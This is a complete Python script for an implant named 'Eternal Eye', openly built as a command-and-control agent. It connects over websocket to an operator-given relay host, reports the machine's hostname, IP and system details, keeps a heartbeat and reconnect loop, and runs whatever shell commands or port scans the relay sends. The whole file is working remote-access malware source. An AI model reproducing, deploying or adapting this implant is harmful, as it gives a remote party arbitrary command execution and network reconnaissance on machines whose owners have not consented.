#!/usr/bin/env python3
import asyncio
import json
import platform
import socket
import subprocess
import time
import websockets
import psutil
from datetime import datetime

class EternalEyeImplant:
    def __init__(self, relay_host, relay_port=8765):
        self.relay_host = relay_host
        self.relay_port = relay_port
        self.implant_id = self.generate_implant_id()
        self.websocket = None
        
    def generate_implant_id(self):
        hostname = socket.gethostname()
        return f"{hostname}-{int(time.time())}"
        
    async def connect_to_relay(self):
        while True:
            try:
                print(f"Connecting to {self.relay_host}:{self.relay_port}...")
                self.websocket = await websockets.connect(
                    f"ws://{self.relay_host}:{self.relay_port}"
                )
                
                await self.register_with_relay()
                await self.listen_for_commands()
                
            except Exception as e:
                print(f"Connection failed: {e}. Retrying in 10 seconds...")
                await asyncio.sleep(10)
                
    async def register_with_relay(self):
        system_info = await self.gather_system_info()
        
        registration_data = {
            'type': 'register',
            'implant_id': self.implant_id,
            'hostname': socket.gethostname(),
            'ip_address': await self.get_ip_address(),
            'system_info': system_info,
            'timestamp': datetime.now().isoformat()
        }
        
        await self.websocket.send(json.dumps(registration_data))
        print(f"✓ Registered with relay as {self.implant_id}")
        
    async def listen_for_commands(self):
        async for message in self.websocket:
            await self.process_command(message)
            
    async def process_command(self, message):
        try:
            data = json.loads(message)
            command_type = data.get('type')
            command_id = data.get('command_id')
            
            response = {'type': 'response', 'command_id': command_id}
            
            if command_type == 'exec':
                result = await self.execute_command(data['command'])
                response['result'] = result
            elif command_type == 'port_scan':
                result = await self.port_scan(data['target'], data.get('ports', '1-100'))
                response['result'] = result
            elif command_type == 'system_info':
                result = await self.gather_system_info()
                response['result'] = result
            else:
                response['error'] = f"Unknown command: {command_type}"
                
            await self.websocket.send(json.dumps(response))
            
        except Exception as e:
            error_response = {
                'type': 'response', 
                'command_id': data.get('command_id'),
                'error': str(e)
            }
            await self.websocket.send(json.dumps(error_response))
            
    async def execute_command(self, command):
        try:
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True,
                timeout=30
            )
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except Exception as e:
            return {'error': str(e)}
            
    async def port_scan(self, target, port_range):
        try:
            open_ports = []
            start_port, end_port = map(int, port_range.split('-'))
            
            print(f"Scanning {target} ports {start_port}-{end_port}...")
            for port in range(start_port, end_port + 1):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
                
            return {'target': target, 'open_ports': open_ports}
        except Exception as e:
            return {'error': str(e)}
            
    async def gather_system_info(self):
        return {
            'platform': platform.platform(),
            'hostname': socket.gethostname(),
            'ip_address': await self.get_ip_address(),
            'cpu_count': psutil.cpu_count(),
            'memory_total': psutil.virtual_memory().total,
        }
        
    async def get_ip_address(self):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except:
            return "127.0.0.1"
            
    async def start_heartbeat(self):
        while True:
            if self.websocket and not self.websocket.closed:
                try:
                    heartbeat = {
                        'type': 'heartbeat',
                        'implant_id': self.implant_id,
                        'timestamp': datetime.now().isoformat(),
                    }
                    await self.websocket.send(json.dumps(heartbeat))
                except:
                    pass
            await asyncio.sleep(30)
            
    async def run(self):
        asyncio.create_task(self.start_heartbeat())
        await self.connect_to_relay()

async def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Eternal Eye Implant')
    parser.add_argument('--relay', required=True, help='Relay server hostname/IP')
    parser.add_argument('--port', type=int, default=8765, help='Relay server port')
    
    args = parser.parse_args()
    
    implant = EternalEyeImplant(args.relay, args.port)
    await implant.run()

if __name__ == "__main__":
    asyncio.run(main())
